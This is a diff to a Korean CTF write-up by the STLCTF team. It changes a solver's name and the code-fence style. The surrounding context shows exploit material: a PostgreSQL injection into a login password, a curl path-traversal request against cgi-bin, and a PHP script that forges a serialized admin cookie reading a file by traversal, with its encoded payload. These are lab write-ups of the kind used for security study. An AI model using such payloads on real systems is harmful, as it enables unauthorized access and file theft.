@@ -227,7 +227,7 @@ Completed.
 
 ## 5 of Diamonds
 
-> Solver is **Yootaek Lim** from **STLCTF**
+> Solver is **YouTaek Lim** from **STLCTF**
 
 11111/tcp에 접근 시 로그인 할 수 있는 웹페이지가 나온다. 사용자명은 admin, 패스워드에 postgresql injection을 통해 공격하여 플래그를 획득할 수 있다.
 
@@ -399,7 +399,7 @@ $ curl --path-as-is -v -X POST 'http://localhost:31337/cgi-bin/%%32%65%%32%65/%%
 > Solved by **Seokchan Yoon (@ch4n3)** from **STLCTF**
 
 20022/tcp에 http로 접근이 가능하다. 다음과 같이 user 쿠키를 변조하여 문제를 해결할 수 있었다:
-```php
+~~~php
 class user {
     function __construct()
     {
@@ -414,13 +414,13 @@ $obj->profile_img = "/var/www/html/../../../../../flag.png";
 
 print(serialize($obj) . "\n\n");
 print(base64_encode(base64_encode(serialize($obj))));
-```
-```
+~~~
+~~~bash
 $ php serialize.php
 O:4:"user":3:{s:8:"username";s:5:"admin";s:5:"admin";b:0;s:11:"profile_img";s:37:"/var/www/html/../../../../../flag.png";}
 
 VHpvME9pSjFjMlZ5SWpvek9udHpPamc2SW5WelpYSnVZVzFsSWp0ek9qVTZJbUZrYldsdUlqdHpPalU2SW1Ga2JXbHVJanRpT2pBN2N6b3hNVG9pY0hKdlptbHNaVjlwYldjaU8zTTZNemM2SWk5MllYSXZkM2QzTDJoMGJXd3ZMaTR2TGk0dkxpNHZMaTR2TGk0dlpteGhaeTV3Ym1jaU8zMD0=
-```
+~~~
 
 ----
 
